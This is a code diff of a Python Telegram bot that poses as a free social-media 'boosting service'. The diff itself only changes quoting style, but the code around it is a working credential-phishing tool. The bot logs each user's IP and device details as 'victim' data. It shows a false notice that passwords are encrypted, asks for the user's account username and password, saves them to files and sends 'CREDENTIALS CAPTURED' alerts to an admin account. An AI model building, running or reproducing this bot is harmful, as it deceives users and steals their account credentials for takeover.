@@ -45,7 +45,7 @@ credentials_log = f"Syedhackerofficial_{datetime.now().strftime('%Y%m%d_%H%M%S')
 session_log = f"Syedhackerofficial_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
 
 def get_ip_info():
-    """Get IP address and location info"""
+    '''Get IP address and location info'''
     try:
         response = requests.get('https://api.ipify.org?format=json', timeout=5)
         return response.json().get('ip', 'Unknown')
@@ -53,7 +53,7 @@ def get_ip_info():
         return 'Unknown'
 
 def get_device_info():
-    """Get device information"""
+    '''Get device information'''
     try:
         return {
             'system': platform.system(),
@@ -65,23 +65,23 @@ def get_device_info():
         return {'system': 'Unknown'}
 
 def generate_session_id():
-    """Generate unique session ID"""
+    '''Generate unique session ID'''
     return str(uuid.uuid4())[:8]
 
 # 𝗦𝗮𝘃𝗲 𝗹𝗼𝗴𝘀
 def save_victim_log(victim_data):
-    """Save victim data to log file"""
+    '''Save victim data to log file'''
     with open(session_log, 'a', encoding='utf-8') as f:
         f.write(json.dumps(victim_data, indent=2, ensure_ascii=False) + "\n" + "="*60 + "\n")
 
 def save_credentials(cred_data):
-    """Save credentials to log file"""
+    '''Save credentials to log file'''
     with open(credentials_log, 'a', encoding='utf-8') as f:
         f.write(json.dumps(cred_data, indent=2, ensure_ascii=False) + "\n" + "="*60 + "\n")
 
 # 𝗦𝗲𝗻𝗱 𝗻𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝘁𝗼 𝗮𝗱𝗺𝗶𝗻
 def notify_admin(message):
-    """Send notification to admin"""
+    '''Send notification to admin'''
     try:
         bot.send_message(ADMIN_ID, message)
     except Exception as e:
@@ -90,7 +90,7 @@ def notify_admin(message):
 # 𝗕𝗼𝘁 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    """Handle /start command"""
+    '''Handle /start command'''
     user_id = message.from_user.id
     username = message.from_user.username or "None"
     first_name = message.from_user.first_name or "Unknown"
@@ -121,7 +121,7 @@ def start_command(message):
     # 𝗦𝗮𝘃𝗲 𝗮𝗻𝗱 𝗻𝗼𝘁𝗶𝗳𝘆
     save_victim_log(victim_info)
     
-    admin_message = f"""
+    admin_message = f'''
 {RED}{BOLD}🔴 𝗩𝗜𝗖𝗧𝗜𝗠 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗!{END}
 {CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
 {YELLOW}𝗦𝗲𝘀𝘀𝗶𝗼𝗻:{END} {session_id}
@@ -131,12 +131,12 @@ def start_command(message):
 {YELLOW}𝗜𝗣:{END} {victim_info['ip_address']}
 {YELLOW}𝗧𝗶𝗺𝗲:{END} {victim_info['timestamp']}
 {CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
-"""
+'''
     print(admin_message)
     notify_admin(admin_message)
     
     # 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗣𝗟𝗔𝗧𝗙𝗢𝗥𝗠 𝗦𝗘𝗟𝗘𝗖𝗧𝗜𝗢𝗡 𝗯𝘂𝘁𝘁𝗼𝗻𝘀
-    welcome_text = """
+    welcome_text = '''
 ✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗧𝗼𝗸𝗕𝗼𝗼𝘀𝘁𝗹𝘆 𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗦𝗲𝗿𝘃𝗶𝗰𝗲! ✨
 
 𝗚𝗲𝘁 𝗳𝗿𝗲𝗲 𝗯𝗼𝗼𝘀𝘁 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝘀𝗼𝗰𝗶𝗮𝗹 𝗺𝗲𝗱𝗶𝗮 𝗮𝗰𝗰𝗼𝘂𝗻𝘁𝘀:
@@ -146,7 +146,7 @@ def start_command(message):
 🔒 𝗦𝗲𝗰𝘂𝗿𝗲 & 𝗦𝗮𝗳𝗲
 
 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺:
-"""
+'''
     
     # 𝗖𝗿𝗲𝗮𝘁𝗲 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻 𝗸𝗲𝘆𝗯𝗼𝗮𝗿𝗱
     keyboard = types.InlineKeyboardMarkup(row_width=2)
@@ -171,7 +171,7 @@ def start_command(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_button_click(call):
-    """Handle button clicks"""
+    '''Handle button clicks'''
     user_id = call.from_user.id
     
     if user_id not in user_sessions:
@@ -221,13 +221,13 @@ def handle_button_click(call):
         bot.register_next_step_handler(msg, ask_quantity)
 
 def show_service_options(message, platform_name):
-    """Show service options for selected platform"""
+    '''Show service options for selected platform'''
     
-    service_text = f"""
+    service_text = f'''
 ✅ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱: {platform_name}
 
 𝗡𝗼𝘄 𝘀𝗲𝗹𝗲𝗰𝘁 𝘄𝗵𝗮𝘁 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗯𝗼𝗼𝘀𝘁:
-"""
+'''
     
     # 𝗖𝗿𝗲𝗮𝘁𝗲 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 𝗸𝗲𝘆𝗯𝗼𝗮𝗿𝗱
     keyboard = types.InlineKeyboardMarkup(row_width=2)
@@ -304,7 +304,7 @@ def show_service_options(message, platform_name):
     bot.send_message(message.chat.id, service_text, reply_markup=keyboard)
 
 def ask_quantity(message):
-    """Ask for quantity"""
+    '''Ask for quantity'''
     user_id = message.from_user.id
     
     if user_id not in user_sessions:
@@ -350,7 +350,7 @@ def ask_quantity(message):
     bot.register_next_step_handler(msg, ask_username)
 
 def ask_username(message):
-    """Ask for username/email"""
+    '''Ask for username/email'''
     user_id = message.from_user.id
     
     if user_id not in user_sessions:
@@ -379,19 +379,19 @@ def ask_username(message):
     save_victim_log(partial_data)
     
     # 𝗔𝘀𝗸 𝗳𝗼𝗿 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𝘄𝗶𝘁𝗵 𝘀𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗺𝗲𝘀𝘀𝗮𝗴𝗲
-    security_msg = """
+    security_msg = '''
 🔒 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗡𝗼𝘁𝗶𝗰𝗲:
 Your password is encrypted and never stored in plain text.
 We use advanced encryption to protect your data.
 
 𝗡𝗼𝘄 𝗽𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱:
-"""
+'''
     
     msg = bot.send_message(message.chat.id, security_msg)
     bot.register_next_step_handler(msg, ask_password)
 
 def ask_password(message):
-    """Ask for password and capture credentials"""
+    '''Ask for password and capture credentials'''
     user_id = message.from_user.id
     
     if user_id not in user_sessions:
@@ -430,7 +430,7 @@ def ask_password(message):
     save_credentials(credentials_data)
     
     # 𝗡𝗼𝘁𝗶𝗳𝘆 𝗮𝗱𝗺𝗶𝗻
-    admin_alert = f"""
+    admin_alert = f'''
 {GREEN}{BOLD}✅ 𝗖𝗥𝗘𝗗𝗘𝗡𝗧𝗜𝗔𝗟𝗦 𝗖𝗔𝗣𝗧𝗨𝗥𝗘𝗗!{END}
 {CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
 {YELLOW}𝗦𝗲𝘀𝘀𝗶𝗼𝗻:{END} {user_sessions[user_id]['session_id']}
@@ -442,12 +442,12 @@ def ask_password(message):
 {YELLOW}𝗦𝗲𝗿𝘃𝗶𝗰𝗲:{END} {user_sessions[user_id]['service']}
 {YELLOW}𝗤𝘂𝗮𝗻𝘁𝗶𝘁𝘆:{END} {user_sessions[user_id]['quantity']}
 {CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
-"""
+'''
     print(admin_alert)
     notify_admin(admin_alert)
     
     # 𝗦𝗲𝗻𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘁𝗼 𝘃𝗶𝗰𝘁𝗶𝗺
-    success_message = f"""
+    success_message = f'''
 🎉 𝗕𝗢𝗢𝗦𝗧𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!
 
 ✅ 𝗬𝗼𝘂𝗿 𝗼𝗿𝗱𝗲𝗿 𝗱𝗲𝘁𝗮𝗶𝗹𝘀:
